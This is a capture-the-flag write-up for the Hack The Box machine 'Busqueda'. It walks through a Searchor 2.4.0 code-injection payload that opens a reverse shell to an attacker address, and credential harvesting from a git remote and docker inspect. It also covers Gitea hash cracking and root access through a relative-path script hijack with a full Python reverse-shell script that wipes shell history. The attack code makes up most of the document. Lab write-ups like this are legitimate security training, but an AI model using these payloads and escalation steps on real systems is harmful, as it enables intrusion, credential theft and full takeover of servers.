---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Busqueda

https://demo.hedgedoc.org/e9a54JZjSsyjwig6RUWQuA#

## NMap

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 07:20 EDT
Nmap scan report for 10.10.11.208
Host is up (0.043s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.05 seconds
```

The machine is python

```
Server: Werkzeug/2.1.2 Python/3.10.6
```

On the bottom of the page **Read all the shit first** `Powered by Flask and Searchor 2.4.0 ` There is a vulnerability in serchor https://github.com/jonnyzar/POC-Searchor-2.4.2

#### Payload

```
nc -lvnp 8888
```

Then in burp

```
engine=AlternativeTo&query=+%27%2C+exec%28%22import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2710.10.16.33%27%2C8888%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3B+os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27%2Fbin%2Fbash%27%2C%27-i%27%5D%29%3B%22%29%29%23
```

So, that's the user

## Root

### Enumaration

The directory is git directory.

```
bash-5.1$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Jul 16 23:02 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
```

Is there a password?

```
bash-5.1$ git remote -v
origin  http://cody:@gitea.searcher.htb/cody/Searcher_site.git (fetch)
origin  http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git (push)
```

That password is the same for the user `svc`. So:

```
ssh svc@10.10.11.208
# jh1usoih2bkjaspwe92
```

It also allows me to run `sudo -l`:

```
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

The script works with docker

```
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS             PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   6 months ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   6 months ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

after some fidling, I am able to use `docker-inspect` command. With format form `https://docs.docker.com/engine/reference/commandline/inspect/` Asking for config returns:

```
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect {{.Config}} mysql_db
{f84a6b33fb5a   false false false map[3306/tcp:{} 33060/tcp:{}] false false false [MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF MYSQL_USER=gitea MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh MYSQL_DATABASE=gitea PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOSU_VERSION=1.14 MYSQL_MAJOR=8.0 MYSQL_VERSION=8.0.31-1.el8 MYSQL_SHELL_VERSION=8.0.31-1.el8] [mysqld] <nil> false mysql:8 map[/var/lib/mysql:{}]  [docker-entrypoint.sh] false  [] map[com.docker.compose.config-hash:1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b com.docker.compose.container-number:1 com.docker.compose.oneoff:False com.docker.compose.project:docker com.docker.compose.project.config_files:docker-compose.yml com.docker.compose.project.working_dir:/root/scripts/docker com.docker.compose.service:db com.docker.compose.version:1.29.2]  <nil> []}
```

### Mysql

Mysql creds: `gitea:yuiu1hoiu4i5ho1uh` and `root:jI86kGUuj87guWr3RyF` Login by (you **need** to use `127.0.0.1`):

```
mysql -h 127.0.0.1 -P 3306 -u root -p
```

I found some password hashes: mysql> select name, passwd, salt, passwd_hash_algo  from user; +---------------+------------------------------------------------------------------------------------------------------+----------------------------------+------------------+ | name          | passwd                                                                                               | salt                             | passwd_hash_algo | +---------------+------------------------------------------------------------------------------------------------------+----------------------------------+------------------+ | administrator | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 | a378d3f64143b284f104c926b8b49dfb | pbkdf2           | | cody          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e | d1db0a75a18e50de754be2aafcad5533 | pbkdf2           | +---------------+------------------------------------------------------------------------------------------------------+----------------------------------+------------------+

### Gitea

Access on URL: http://gitea.searcher.htb/ Check the passwords: https://cyberchef.org/#recipe=Derive_PBKDF2_key(%7B'option':'UTF8','string':'yuiu1hoiu4i5ho1uh'%7D,256,10000,'SHA256',%7B'option':'Hex','string':'a378d3f64143b284f104c926b8b49dfb'%7D)&input=amgxdXNvaWgyYmtqYXNwd2U5Mg

Parameters are:

```
# https://github.com/go-gitea/gitea/blob/24b49bcf6615a05cecb77568a1c22ff982141918/models/migrations/base/hash.go#L14
func HashToken(token, salt string) string {
	tempHash := pbkdf2.Key([]byte(token), []byte(salt), 10000, 50, sha256.New)
	return hex.EncodeToString(tempHash)
```

Creds are:  `administrator:yuiu1hoiu4i5ho1uh`

With that I can see the contents of repositories. And I notice a mistake in the script `system-checkup.py`. There is a relative path that I can easily abuse.

```
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

So I create a reverse shell script named in `/tmp` from where i run the `system-checkup.py`.

```
# Filename: /tmp/.razzmann/full-checkup.sh

#!/usr/bin/python3

import os
import pty
import socket

lhost = "10.10.16.16" # XXX: CHANGEME
lport = 7777 # XXX: CHANGEME

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()

if __name__ == "__main__":
    main()
```

Then I start listener `nc -lvnp 7777` and run: `svc@busqueda:/tmp/.razzmann$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`

Bang, I am Root!